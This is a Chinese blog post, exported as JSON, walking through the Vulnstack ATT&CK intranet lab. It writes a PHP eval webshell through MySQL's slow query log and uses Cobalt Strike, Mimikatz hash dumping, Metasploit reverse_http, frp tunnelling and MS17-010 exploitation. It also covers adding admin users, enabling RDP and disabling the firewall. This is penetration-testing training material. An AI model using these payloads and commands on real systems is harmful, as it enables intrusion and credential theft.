{"title":"内网靶场实战——ATT&CK实战系列（一）","uid":"1435f592b7abfcf9251a6298346c1f3d","slug":"内网靶场实战——ATT&CK实战系列（一）","date":"2023-02-27T18:04:20.000Z","updated":"2024-02-14T07:48:44.000Z","comments":true,"path":"api/articles/内网靶场实战——ATT&CK实战系列（一）.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141543894.png","content":"<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>靶场地址<a href=\"http://vulnstack.qiyuanxuetang.net/vuln/detail/2/\">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>下载过文件后，需配置如下两个虚拟网络（一个内网，一个外网）<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541796.png\" alt=\"在这里插入图片描述\"><br>靶场拓扑图如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541162.png\" alt=\"在这里插入图片描述\"><br>这里我们的win7是作为Web服务器的，所以我们需要给Web服务器配置两张网卡，如下所示<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541124.png\" alt=\"在这里插入图片描述\"><br>另外两台机器则是内网机器，只需要设置一张网卡即可<img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541138.png\" alt=\"在这里插入图片描述\"><br>接下来如何检测环境是否搭建完成了呢<br>通过<code>ipconfig</code>可查看本机ip，我们这里准备一个<code>kali</code>机器作为攻击机，然后用win7来ping<code>kali</code>机器，再ping两台内网机器，如果可以<code>ping</code>通则说明没问题<br>接下来在Win7中开启<code>phpstudy</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541145.png\" alt=\"在这里插入图片描述\"><br>至此，环境搭建完成。</p>\n<p>本次使用的攻击机及靶场IP</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">kali<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.128</span>\nWin7：外网<span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>  内网<span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.143</span>\nWin2003：<span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nWin Server<span class=\"token punctuation\">:</span> <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.138</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<h1 id=\"外网\"><a href=\"#外网\" class=\"headerlink\" title=\"外网\"></a>外网</h1><h2 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h2><p>假设现在已知靶机ip，我们使用<code>nmap</code>对外网进行扫描</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nmap<span class=\"token operator\">.</span>exe <span class=\"token operator\">-</span>p1<span class=\"token operator\">-</span><span class=\"token number\">65535</span> <span class=\"token operator\">-</span>Pn <span class=\"token operator\">-</span><span class=\"token constant\">A</span> <span class=\"token operator\">-</span><span class=\"token constant\">T4</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.129</span>\n<span class=\"token comment\">//这个命令行指令是使用nmap工具（nmap.exe）扫描IP地址为192.168.10.22的设备，扫描端口范围为</span>\n<span class=\"token number\">1</span><span class=\"token operator\">-</span><span class=\"token number\">65535</span>，使用<span class=\"token operator\">-</span>Pn选项表示不进行主机发现，使用<span class=\"token operator\">-</span><span class=\"token constant\">A</span>选项表示进行操作系统指纹识别，使用<span class=\"token operator\">-</span><span class=\"token constant\">T4</span>选项表示\n扫描速度为最快。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541392.png\" alt=\"在这里插入图片描述\"><br>探测到80及3306端口存活，访问一下发现是PHP探针<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541705.png\" alt=\"在这里插入图片描述\"><br>发现绝对路径泄露，接下来扫描一下是否有其他敏感信息泄露，使用<code>dirsearch</code>进行扫描<br>此时发现<code>phpmyadmin</code>文件存在，访问之<br>尝试弱口令登录，<code>root/root</code>成功登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541742.png\" alt=\"在这里插入图片描述\"><br>接下来这里的话是我们可以尝试Mysql写入一句话木马，因为我们刚刚在PHP探针界面已知了绝对路径<br>这里的话我们首先看一下是否有写入权限</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token constant\">SHOW</span> <span class=\"token keyword\">GLOBAL</span> <span class=\"token constant\">VARIABLES</span> <span class=\"token constant\">LIKE</span> <span class=\"token string single-quoted-string\">'%secure%'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541964.png\" alt=\"在这里插入图片描述\"><br><code>secure_file_priv</code>为<code>NULL</code>，禁止导入导出。</p>\n<h2 id=\"写入木马\"><a href=\"#写入木马\" class=\"headerlink\" title=\"写入木马\"></a>写入木马</h2><p>接下来去寻找绕过<code>secure_file_priv</code>的方法，发现这篇文章<br><a href=\"https://www.cnblogs.com/c1e4r/articles/8902444.html\">https://www.cnblogs.com/c1e4r/articles/8902444.html</a><br>思路与PHP文件包含中的日志UA传马类似，这里相比更简单一些，通过在日志中写日志，修改日志路径，实现写马。</p>\n<p>慢查询日志默认是禁用的，我们这里对其进行开启</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">set <span class=\"token keyword\">global</span> slow_query_log<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541761.png\" alt=\"在这里插入图片描述\"><br>接下来修改<code>slow_query_log_file</code>日志文件的绝对路径以及文件名，我们这里已知绝对路径，因此直接写即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">set <span class=\"token keyword\">global</span> slow_query_log_file<span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'C:/phpStudy/WWW/shell.php'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541091.png\" alt=\"在这里插入图片描述\"><br>此时可以看一下是否修改成功</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">show variables like <span class=\"token string single-quoted-string\">'%slow%'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541150.png\" alt=\"在这里插入图片描述\"><br>可以看到路径是绝对文件路径。<br>接下来向日志文件写入<code>shell</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">'<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token delimiter important\">?></span></span>' or sleep(10)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541183.png\" alt=\"在这里插入图片描述\"><br>成功执行命令，用蚁剑连接<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541230.png\" alt=\"在这里插入图片描述\"><br><code>ipconfig</code>查看一下网段信息<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541493.png\" alt=\"在这里插入图片描述\"><br>发现还有另一个ip，一眼顶真，有两张网卡，<code>192.168.52.143</code>为内网IP</p>\n<h2 id=\"Cs上线\"><a href=\"#Cs上线\" class=\"headerlink\" title=\"Cs上线\"></a>Cs上线</h2><p>接下来Cs上线，具体步骤如下<br>设置木马<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541535.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541595.png\" alt=\"在这里插入图片描述\"><br>监听81端口，而后生成木马文件（记得关闭本机的杀软，例如火绒）<br>接下来通过中国蚁剑上传木马文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541651.png\" alt=\"在这里插入图片描述\"><br>在虚拟终端中执行木马文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541910.png\" alt=\"在这里插入图片描述\"><br>此时可以看到Win7成功上线</p>\n<h1 id=\"内网\"><a href=\"#内网\" class=\"headerlink\" title=\"内网\"></a>内网</h1><h2 id=\"信息搜集-1\"><a href=\"#信息搜集-1\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h2><p>Cs此时已上线，我们使用<code>hashdump</code>抓取密码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">hashdump<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541941.png\" alt=\"在这里插入图片描述\"><br>运行<code>Mimikatz</code>获取明文密码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541975.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541048.png\" alt=\"在这里插入图片描述\"><br>在蚁剑虚拟终端中执行如下指令，判断是否存在域及当前域</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">net config workstation<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541268.png\" alt=\"在这里插入图片描述\"><br>可以确定当前域为<code>god.org</code><br>查看域内机器</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">Net view<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541317.png\" alt=\"在这里插入图片描述\"><br>可以发现有两台内网机器，同时确定域服务器名称为<code>OWA</code><br>接下来联动<code>msf</code>，继续进行渗透<br>在<code>kali</code>中输入<code>msfconsole</code>进入msf<br>接下来利用handler模块开启监听</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">msf6 <span class=\"token operator\">></span> <span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>multi<span class=\"token operator\">/</span>handler\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>multi<span class=\"token operator\">/</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> set payload windows<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>reverse_http\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>multi<span class=\"token operator\">/</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> set lhost <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.128</span>\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>multi<span class=\"token operator\">/</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> set lport <span class=\"token number\">8888</span>\nmsf6 <span class=\"token function\">exploit</span><span class=\"token punctuation\">(</span>multi<span class=\"token operator\">/</span>handler<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> run<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541333.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来回到Cs，右键选择<code>Spawn</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541430.png\" alt=\"在这里插入图片描述\"><br>设置Payload为<code>Foreign HTTP</code>，监听ip为<code>kali</code>IP，端口为刚刚的<code>8888</code>端口<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541567.png\" alt=\"在这里插入图片描述\"><br>而后选择<code>choose</code><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541616.png\" alt=\"在这里插入图片描述\"><br>成功上线msf，接下来搜集补丁信息</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run post<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>gather<span class=\"token operator\">/</span>enum_patches<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541646.png\" alt=\"在这里插入图片描述\"><br>搜集电脑上安装的软件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run post<span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>gather<span class=\"token operator\">/</span>enum_applications<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541814.png\" alt=\"在这里插入图片描述\"><br>发现存在<code>nmap</code><br>已知这里存在内网，我们这里添加新路由</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">run autoroute <span class=\"token operator\">-</span>s <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.0</span><span class=\"token operator\">/</span><span class=\"token number\">24</span>\nrun autoroute <span class=\"token operator\">-</span>p<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541926.png\" alt=\"在这里插入图片描述\"></p>\n<p>接下来去设置代理，这里使用<code>frp</code>进行内网穿透，首先在kali中执行命令如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">.</span><span class=\"token operator\">/</span>frps <span class=\"token operator\">-</span>c frps<span class=\"token operator\">.</span>ini<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541955.png\" alt=\"在这里插入图片描述\"><br>接下来将<code>frpc.exe</code>和<code>frpc.ini</code>通过蚁剑上传到win7，修改<code>frpc.ini</code>内容如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token punctuation\">[</span>common<span class=\"token punctuation\">]</span>\nserver_addr <span class=\"token operator\">=</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.128</span>\nserver_port <span class=\"token operator\">=</span> <span class=\"token number\">7000</span>\n\n<span class=\"token punctuation\">[</span>plugin_socks<span class=\"token punctuation\">]</span>\ntype <span class=\"token operator\">=</span> tcp remote_port <span class=\"token operator\">=</span> <span class=\"token number\">7777</span> plugin <span class=\"token operator\">=</span> socks5<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来执行<code>frpc</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">frpc<span class=\"token operator\">.</span>exe <span class=\"token operator\">-</span>c frpc<span class=\"token operator\">.</span>ini<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541976.png\" alt=\"在这里插入图片描述\"><br>可以发现代理已设置成功，直接对内网机器进行攻击即可，扫描机器存活端口</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>scanner<span class=\"token operator\">/</span>portscan<span class=\"token operator\">/</span>tcp\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nset threads <span class=\"token number\">100</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541240.png\" alt=\"在这里插入图片描述\"><br>扫描到存在<code>135、445</code>端口，说明存在<code>SMB</code>服务</p>\n<h2 id=\"接管域成员\"><a href=\"#接管域成员\" class=\"headerlink\" title=\"接管域成员\"></a>接管域成员</h2><p>首先扫描机器版本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>scanner<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_version\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541275.png\" alt=\"在这里插入图片描述\"><br>发现是Windows2003版本，那么接下来我们验证一下是否存永恒之蓝漏洞</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">search ms17<span class=\"token operator\">-</span><span class=\"token number\">010</span>\n<span class=\"token keyword\">use</span> <span class=\"token number\">1</span>\nset <span class=\"token constant\">RHOSTS</span> <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541331.png\" alt=\"在这里插入图片描述\"><br>可以发现确实存在永恒之蓝漏洞，直接打</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token number\">2</span>\nset payload windows<span class=\"token operator\">/</span>x64<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nset rhost <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nset lport <span class=\"token number\">11111</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>但此时没打下来，因此尝试执行一些命令</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>admin<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_command\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nset command whoami\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541388.png\" alt=\"在这里插入图片描述\"><br>这里的话我们的思路是添加用户，升级为管理员权限，然后尝试手动开启3389端口实现机器接管</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">set command net user test hongrisec@<span class=\"token number\">2019</span> <span class=\"token operator\">/</span>add <span class=\"token comment\">#添加用户</span>\nrun <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541650.png\" alt=\"在这里插入图片描述\"><br>接下来添加管理员权限</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">set command net localgroup administrators test <span class=\"token operator\">/</span>add <span class=\"token comment\">#管理员权限</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541662.png\" alt=\"在这里插入图片描述\"><br>接下来尝试开启3389端口</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">set command <span class=\"token string single-quoted-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\nrun <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541750.png\" alt=\"在这里插入图片描述\"><br>但此时去远控主机却出现了点问题<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541831.png\" alt=\"在这里插入图片描述\"><br>所以接下来更换一下代理方式，将<code>frp</code>换为socks5</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>server<span class=\"token operator\">/</span>socks_proxy\nset <span class=\"token constant\">SRVHOST</span> <span class=\"token number\">192.168</span><span class=\"token number\">.10</span><span class=\"token number\">.128</span>\nset <span class=\"token constant\">SRVPORT</span> <span class=\"token number\">1080</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>而后编辑一下配置文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">vim <span class=\"token operator\">/</span>etc<span class=\"token operator\">/</span>proxychains<span class=\"token operator\">.</span>conf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>内容如下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541077.png\" alt=\"在这里插入图片描述\"><br>接下来尝试远控域成员</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">proxychains rdesktop <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541124.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541155.png\" alt=\"在这里插入图片描述\"><br>用刚刚写入的用户名和密码即可登入<br>接下来进行反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_psexec\nset payload windows<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.141</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541191.png\" alt=\"在这里插入图片描述\"><br>至此，成功接管域内机器<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541466.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"接管域控\"><a href=\"#接管域控\" class=\"headerlink\" title=\"接管域控\"></a>接管域控</h2><p>扫描域控存活端口发现<code>135、445</code>存活，存在<code>SMB</code>服务，探测主机版本</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>scanner<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>smb_version\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.138</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541538.png\" alt=\"在这里插入图片描述\"><br>接下来同上，执行命令，添加管理员，反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">auxiliary</span><span class=\"token operator\">/</span>admin<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_command\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.138</span>\nset command whoami\nrun\nset command <span class=\"token string single-quoted-string\">'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</span>\nrun\nset command netsh firewall set opmode mode<span class=\"token operator\">=</span>disable <span class=\"token comment\">#关闭防火墙</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541567.png\" alt=\"在这里插入图片描述\"><br>接下来可以用刚刚抓取到的密码进行远程登录<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541584.png\" alt=\"在这里插入图片描述\"></p>\n<p>而后我们反弹shell</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">use</span> <span class=\"token package\">exploit</span><span class=\"token operator\">/</span>windows<span class=\"token operator\">/</span>smb<span class=\"token operator\">/</span>ms17_010_psexec\nset payload windows<span class=\"token operator\">/</span>meterpreter<span class=\"token operator\">/</span>bind_tcp\nset rhosts <span class=\"token number\">192.168</span><span class=\"token number\">.52</span><span class=\"token number\">.138</span>\nrun<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141541885.png\" alt=\"在这里插入图片描述\"><br>至此，成功接管域控。</p>\n<h1 id=\"参考文章\"><a href=\"#参考文章\" class=\"headerlink\" title=\"参考文章\"></a>参考文章</h1><p><a href=\"https://xz.aliyun.com/t/10076#toc-8\">https://xz.aliyun.com/t/10076#toc-8</a><br><a href=\"https://www.freebuf.com/vuls/244095.html\">https://www.freebuf.com/vuls/244095.html</a></p>\n","feature":true,"text":"环境搭建靶场地址http://vulnstack.qiyuanxuetang.net/vuln/detail/2/下载过文件后，需配置如下两个虚拟网络（一个内网，一个外网）靶场拓扑图如下这里我们的win7是作为Web服务器的，所以我们需要给Web服务器配置两张网卡，如下所示另外两...","link":"","photos":[],"count_time":{"symbolsCount":"4.3k","symbolsTime":"4 mins."},"categories":[{"name":"内网","slug":"内网","count":12,"path":"api/categories/内网.json"}],"tags":[{"name":"内网","slug":"内网","count":13,"path":"api/tags/内网.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%96%E7%BD%91\"><span class=\"toc-text\">外网</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86\"><span class=\"toc-text\">信息搜集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC\"><span class=\"toc-text\">写入木马</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Cs%E4%B8%8A%E7%BA%BF\"><span class=\"toc-text\">Cs上线</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%86%85%E7%BD%91\"><span class=\"toc-text\">内网</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1\"><span class=\"toc-text\">信息搜集</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%88%90%E5%91%98\"><span class=\"toc-text\">接管域成员</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7\"><span class=\"toc-text\">接管域控</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">参考文章</span></a></li></ol>","author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Flask 从0到0.1 part-01","uid":"d70f7939ae7e6d64d51d92d64d7620bd","slug":"Flask从0到0.1 